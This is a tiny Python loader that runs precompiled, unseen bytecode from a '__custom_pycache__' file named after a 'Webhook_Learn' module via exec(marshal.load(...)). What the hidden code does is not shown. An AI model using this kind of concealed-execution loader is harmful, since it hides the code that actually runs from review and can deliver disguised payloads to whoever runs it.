
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Webhook_Learn_cd6068ce59484fa481cab3c1f976cd3c.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
